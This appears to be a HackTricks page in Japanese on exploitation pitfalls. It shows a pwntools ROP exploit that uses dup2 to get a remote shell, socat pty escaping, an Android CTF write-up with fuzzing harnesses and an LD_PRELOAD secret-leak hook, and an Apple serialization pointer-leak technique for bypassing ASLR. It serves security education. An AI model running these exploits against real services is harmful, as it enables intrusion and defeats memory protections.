# よくあるエクスプロイトの問題

{{#include ../banners/hacktricks-training.md}}

## リモートエクスプロイトにおける FDs（ファイルディスクリプタ）

リモートサーバに対して例えば **`system('/bin/sh')`** を呼ぶエクスプロイトを送ると、これは当然サーバプロセス内で実行され、`/bin/sh` は stdin (FD: `0`) からの入力を期待し、stdout と stderr (FDs `1` と `2`) に出力を行います。したがって、攻撃者はシェルと対話できません。

この対処法の一つは、サーバ起動時にリスニング用として **FD番号 `3`** が作成され、その後あなたの接続が **FD番号 `4`** になると仮定することです。したがって、syscall **`dup2`** を使って stdin (FD `0`) と stdout (FD `1`) を攻撃者の接続に対応する FD `4` に複製すれば、シェルが実行された後に接続して操作できるようになります。

[**Exploit example from here**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

socat は既に **`stdin`** と **`stdout`** をソケットに転送する点に注意してください。ただし、`pty` モードは **DELETE 文字を含みます**。したがって、` \x7f`（`DELETE`）を送ると、エクスプロイトの前の文字が**削除されます**。

これを回避するには、送信するすべての `\x7f` の前に **エスケープ文字 `\x16` を付加する** 必要があります。

**ここで** [**この挙動の例**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**

## Android AArch64 shared-library fuzzing & LD_PRELOAD hooking

Android アプリが stripped な AArch64 `.so` のみを配布している場合でも、APK を再ビルドせずに on-device でエクスポートされたロジックを直接 fuzz できます。実用的なワークフロー:

1. **呼び出し可能なエントリポイントを特定する。** `objdump -T libvalidate.so | grep -E "validate"` はエクスポートされた関数を素早く一覧表示します。Decompilers (Ghidra, IDA, BN) は実際のシグネチャを明らかにします（例: `int validate(const uint8_t *buf, uint64_t len)`）。
2. **スタンドアロンの harness を作成する。** ファイルを読み込み、バッファを保持し、アプリが行うのと同じ方法でエクスポートされたシンボルを呼び出します。NDK でクロスコンパイルします（例: `aarch64-linux-android21-clang harness.c -L. -lvalidate -fPIE -pie`）。

<details>
<summary>最小限のファイル駆動ハーネス</summary>
```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

extern int validate(const uint8_t *buf, uint64_t len);

int main(int argc, char **argv) {
if (argc < 2) return 1;
int fd = open(argv[1], O_RDONLY);
if (fd < 0) return 1;
struct stat st = {0};
if (fstat(fd, &st) < 0) return 1;
uint8_t *buffer = malloc(st.st_size + 1);
read(fd, buffer, st.st_size);
close(fd);
int ret = validate(buffer, st.st_size);
free(buffer);
return ret;
}
```
</details>

3. **期待される構造を再構築する。** Ghidra のエラー文字列や比較から、その関数は定数キー（`magic`, `version`, ネストした `root.children.*`）を持つ厳格な JSON を解析し、算術チェック（例: `value * 2 == 84` ⇒ `value` は `42`）を行っていることがわかった。各分岐を逐次満たす構文的に正しい JSON を与えることで、計測ツール無しにスキーマをマッピングできる。
4. **Bypass anti-debug to leak secrets.** その `.so` が `snprintf` をインポートしているため、`LD_PRELOAD` で上書きして、breakpoints がブロックされている場合でも機密なフォーマット文字列をダンプできる：

<details>
<summary>Minimal snprintf leak hook</summary>
```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

typedef int (*vsnprintf_t)(char *, size_t, const char *, va_list);

int snprintf(char *str, size_t size, const char *fmt, ...) {
static vsnprintf_t real_vsnprintf;
if (!real_vsnprintf)
real_vsnprintf = (vsnprintf_t)dlsym(RTLD_NEXT, "vsnprintf");

va_list args;
va_start(args, fmt);
va_list args_copy;
va_copy(args_copy, args);
if (fmt && strstr(fmt, "MHL{")) {
fprintf(stdout, "[LD_PRELOAD] flag: ");
vfprintf(stdout, fmt, args);
fputc('\n', stdout);
}
int ret = real_vsnprintf(str, size, fmt, args_copy);
va_end(args_copy);
va_end(args);
return ret;
}
```
</details>

`LD_PRELOAD=./hook.so ./validate_harness payload.json` は、バイナリをパッチせずに内部フラグを外部へ持ち出し、crash oracle を確認した。
5. **Shrink the fuzz space.** 逆アセンブリにより、flag 比較で再利用されている XOR key が露呈し、`flag` の最初の7バイトが既知であることが分かった。未知の9バイトのみを fuzz する。
6. **Embed fuzz bytes inside a valid JSON envelope.** AFL ハーネスは `stdin` から正確に9バイトを読み取り、それらを flag のサフィックスにコピーし、他の全てのフィールド（constants、tree depths、arithmetic preimage）をハードコードする。読み取りが不正だと単に終了するため、AFL は有意義なテストケースにサイクルを費やす:

<details>
<summary>最小限の AFL harness</summary>
```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

extern int validate(unsigned char *bytes, size_t len);

#define FUZZ_SIZE 9

int main(void) {
uint8_t blob[FUZZ_SIZE];
if (read(STDIN_FILENO, blob, FUZZ_SIZE) != FUZZ_SIZE) return 0;
char suffix[FUZZ_SIZE + 1];
memcpy(suffix, blob, FUZZ_SIZE);
suffix[FUZZ_SIZE] = '\0';
char json[512];
int len = snprintf(json, sizeof(json),
"{\"magic\":16909060,\"version\":1,\"padding\":0,\"flag\":\"MHL{827b07c%s}\"," \
"\"root\":{\"type\":16,\"level\":3,\"num_children\":1,\"children\":[" \
"{\"type\":32,\"level\":2,\"num_children\":1,\"subchildren\":[" \
"{\"type\":48,\"level\":1,\"num_children\":1,\"leaves\":[" \
"{\"type\":64,\"level\":0,\"reserved\":0,\"value\":42}]}}]}}",
suffix);
if (len <= 0 || (size_t)len >= sizeof(json)) return 0;
validate((unsigned char *)json, len);
return 0;
}
```
</details>

7. **Run AFL with the crash-as-success oracle.** Any input that satisfies every semantic check and guesses the correct nine-byte suffix triggers the deliberate crash; those files land in `output/crashes` and can be replayed through the simple harness to recover the secret.

This workflow lets you triage anti-debug-protected JNI validators quickly, leak secrets when needed, then fuzz only the meaningful bytes, all without touching the original APK.

## Pointer-Keyed Hash Table Pointer Leaks on Apple Serialization

### Requirements & attack surface

- サービスが攻撃者制御下の property lists (XML または binary) を受け取り、許容的な allowlist（例：`NSDictionary`, `NSArray`, `NSNumber`, `NSString`, `NSNull`）で `NSKeyedUnarchiver.unarchivedObjectOfClasses` を呼び出す。
- 生成されたオブジェクトが再利用され、その後 `NSKeyedArchiver` で再度シリアライズされる（または決定論的なバケット順でイテレーションされる）ことで、攻撃者へ返送される。
- コンテナ内のあるキー型がハッシュコードとしてポインタ値を使う。March 2025 以前、`CFNull`/`NSNull` はフォールバックで `CFHash(object) == (uintptr_t)object` を返し、デシリアライズは常に shared-cache のシングルトン `kCFNull` を返していたため、メモリ破損やタイミングを伴わずにプロセス間で安定したカーネル共有ポインタが得られた。

### Controllable hashing primitives

- **Pointer-based hashing:** `CFNull` の `CFRuntimeClass` には hash callback がなく、`CFBasicHash` はオブジェクトアドレスをハッシュとして使う。シングルトンは再起動まで固定の shared-cache アドレスに存在するため、そのハッシュはプロセス間で安定する。
- **Attacker-controlled hashes:** 32-bit `NSNumber` キーは `_CFHashInt` を通してハッシュ化され、これは決定論的かつ攻撃者が制御可能である。特定の整数を選ぶことで、任意のテーブルサイズに対して `hash(number) % num_buckets` を攻撃者が選べる。
- **`NSDictionary` implementation:** イミュータブルな辞書は `CFBasicHash` を埋め込み、`__CFBasicHashTableSizes`（例：23, 41, 71, 127, 191, 251, 383, 631, 1087）から選ばれた素数バケット数を持つ。衝突は線形プロービング（`__kCFBasicHashLinearHashingValue`）で処理され、シリアライズは数値順のバケットを巡るため、シリアライズされるキーの順序は各キーが最終的に占めたバケットインデックスを符号化する。

### Encoding bucket indices into serialization order

plist を巧妙に作成して、バケットが占有と空きとで交互になる辞書を具現化すれば、攻撃者は線形プロービングが `NSNull` を配置できる位置を制約できる。7 バケットの例では、偶数バケットを `NSNumber` キーで埋めると次のようになる：
```text
bucket:          0 1 2 3 4 5 6
occupancy:       # _ # _ # _ #
```
逆シリアライズの過程で被害者は単一の `NSNull` キーを挿入します。初期のバケットは `hash(NSNull) % 7` ですが、プロービングにより {1,3,5} のいずれかの空きインデックスに当たるまで進みます。シリアライズされたキーの順序からどのスロットが使われたかが判明し、ポインタのハッシュの 7 での剰余が {6,0,1}、{2,3}、または {4,5} のどれに属するかが分かります。攻撃者が元のシリアライズ順序を制御できるため、`NSNull` キーは入力 plist の最後に出力され、再シリアライズ後の並びはバケット配置だけに依存します。

### 補完的テーブルで正確な剰余を特定する

単一の辞書では剰余の範囲しか漏れません。`hash(NSNull) % p` の正確な値を決めるには、素数バケットサイズ `p` ごとに**2つ**の辞書を作ります：偶数バケットで事前に埋めたものと奇数バケットで事前に埋めたもの。補完パターン（`_ # _ # _ # _`）では、空のスロット (0,2,4,6) は剰余集合 {0}, {1,2}, {3,4}, {5,6} に対応します。両方の辞書で `NSNull` のシリアライズされた位置を観察すれば、候補集合の共通部分がその `p` に対応する一意の `r_i` を与えるため、剰余は一つに絞られます。

攻撃者は全ての辞書を `NSArray` にまとめるため、1 回の deserialize → serialize ラウンドトリップで選択したすべてのテーブルサイズについて剰余が漏れます。

### 64-bit shared-cache ポインタの再構築

各素数 `p_i ∈ {23, 41, 71, 127, 191, 251, 383, 631, 1087}` について、攻撃者はシリアライズ順序から `hash(NSNull) ≡ r_i (mod p_i)` を回復します。拡張ユークリッド互除法と中国剰余定理 (CRT) を適用すると、以下が得られます：
```text
Π p_i = 23·41·71·127·191·251·383·631·1087 = 0x5ce23017b3bd51495 > 2^64
```
したがって、結合された剰余は唯一 `kCFNull` を指す64ビットポインタに一致します。Project Zero の PoC は、中間の法（moduli）を出力しつつ合同式を反復的に組み合わせ、真のアドレス（脆弱なビルドでは `0x00000001eb91ab60`）へ収束する様子を示します。

### 実践的ワークフロー

1. **細工した入力を生成する:** 攻撃者側の XML plist を作成する（prime ごとに 2 つの dictionary、`NSNull` を最後にシリアライズ）し、バイナリ形式に変換する。
```bash
clang -o attacker-input-generator attacker-input-generator.c
./attacker-input-generator > attacker-input.plist
plutil -convert binary1 attacker-input.plist
```
2. **被害者の往復処理:** 被害者側サービスは `NSKeyedUnarchiver.unarchivedObjectOfClasses` で復号化し、許可クラスセット `{NSDictionary, NSArray, NSNumber, NSString, NSNull}` を使用して、直ちに `NSKeyedArchiver` で再シリアライズします。
3. **Residue extraction:** 返却された plist を再び XML に変換すると、dictionary のキー順序が分かります。`extract-pointer.c` のようなヘルパーはオブジェクトテーブルを読み、単一の `NSNull` のインデックスを特定し、各 dictionary ペアを対応するバケット剰余にマッピングして CRT システムを解き、shared-cache ポインタを復元します。
4. **検証（任意）:** `CFHash(kCFNull)` を出力する小さな Objective-C ヘルパーをコンパイルすると、leaked value が実際のアドレスと一致することを確認できます。

メモリ安全のバグは不要です — 単に pointer-keyed 構造のシリアライズ順序を観察するだけで、リモート ASLR バイパスのプリミティブが得られます。

## 関連ページ

{{#ref}}
common-exploiting-problems-unsafe-relocation-fixups.md
{{#endref}}

{{#ref}}
../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

{{#ref}}
../reversing/reversing-tools-basic-methods/README.md
{{#endref}}

## References

- [FD duplication exploit example](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
- [Socat delete-character behaviour](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)
- [FuzzMe – Reverse Engineering and Fuzzing an Android Shared Library](https://hackmd.io/@sal/fuzzme-mobilehackinglab-ctf-writeup)
- [Pointer leaks through pointer-keyed data structures (Project Zero)](https://projectzero.google/2025/09/pointer-leaks-through-pointer-keyed.html)

{{#include ../banners/hacktricks-training.md}}
